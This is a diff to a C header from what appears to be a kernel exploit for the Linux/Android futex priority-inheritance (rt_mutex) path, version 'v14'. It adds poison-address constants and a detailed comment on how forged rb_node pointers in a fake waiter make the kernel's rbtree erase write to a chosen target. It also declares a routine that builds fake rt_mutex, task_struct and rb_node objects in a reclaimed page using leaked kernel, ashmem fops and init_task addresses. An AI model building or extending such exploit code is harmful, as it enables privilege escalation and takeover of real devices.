@@ -116,6 +116,41 @@ struct futex_pi_v14_config {
 #define FUTEX_PI_V14_STEP_DONE 6
 
 /*
+ * =============================================================================
+ * POISON PROBE  -  compiled ONLY by build_f946b_poison.bat (-DFUTEX_POISON_PROBE=1)
+ * =============================================================================
+ * The question the source analysis could not answer: when the kernel finally
+ * erases our forged node, WHICH of the two rb_node copies in the forged waiter
+ * does it erase? The v14 payload writes both:
+ *
+ *   tree_entry.rb_right      = the write target        (H1, adjust_prio_chain
+ *                                                       route, rtmutex.c:868)
+ *   pi_tree_entry.rb_right   = the write target        (H2, mark_wakeup route,
+ *                                                       rtmutex.c:1249)
+ *
+ * Both rb_parent_color fields are pointed at a VALID writable kernel address
+ * (cfg->fake_fops) rather than at a sentinel, so the erase runs to completion
+ * and the ONLY faulting access is the final `child->__rb_parent_color = pc`
+ * store in __rb_erase_augmented() (rbtree_augmented.h:218). The faulting
+ * address is therefore an unambiguous discriminator:
+ *
+ *   fault at FUTEX_PI_V14_POISON_TREE_RIGHT    -> tree_entry    was erased (H1)
+ *   fault at FUTEX_PI_V14_POISON_PI_TREE_RIGHT -> pi_tree_entry was erased (H2)
+ *   no fault, no panic                          -> no erase ever happened; the
+ *                                                  forged objects are never
+ *                                                  reached and v14 is dead on
+ *                                                  this kernel
+ *
+ * The two addresses are 8 bytes apart so a single fault cannot be ambiguous,
+ * and both are in the non-canonical hole on arm64 (top byte 0xde) so the fault
+ * is an immediate synchronous translation fault at the exact address, with no
+ * chance of a wild write landing somewhere real.
+ * =============================================================================
+ */
+#define FUTEX_PI_V14_POISON_TREE_RIGHT 0xdeadbeefcafe0000ULL
+#define FUTEX_PI_V14_POISON_PI_TREE_RIGHT 0xdeadbeefcafe0008ULL
+
+/*
  * Run the whole choreography once. Returns 1 only if the mutation boundary was
  * crossed (i.e. sched_setattr was issued on the waiter after the gate), which
  * is the reference's notion of "triggered"; any other value means nothing
@@ -125,6 +160,21 @@ struct futex_pi_v14_config {
  * live path is a separate decision and is NOT authorised by landing this file.
  */
 int futex_pi_v14_trigger(const struct futex_pi_v14_config *cfg);
+
+/* Populate the reclaim page with the fake rt_mutex_base, fake waiter task_struct,
+ * fake task_struct and the two spare rb_nodes that the PI traversal walks.
+ *
+ * Must be called BEFORE the page is slid into place: every intra-forge pointer is written as
+ * (aligned_base | its own offset), so the graph becomes self-consistent the moment the page lands
+ * and no fixup pass is needed afterwards. `page` must be at least SKB_SEND_SIZE bytes and
+ * `aligned_base` must be the 16 MiB-aligned address the page will occupy.
+ *
+ * This is the port of the reference's 04_fake_kernel_objects.c that was the missing piece for this
+ * route; it is inert on its own and only has an effect once something writes `page` into the
+ * reclaim page. */
+void pi_v14_forge_page_objects(unsigned char *page, uint64_t aligned_base,
+                               uint64_t kernel_base, uint64_t ashmem_fops_addr,
+                               uint64_t init_task_addr);
 
 /* Last step reached, one of the FUTEX_PI_V14_STEP_* values; -1 before the first
  * call. Diagnostics only. */
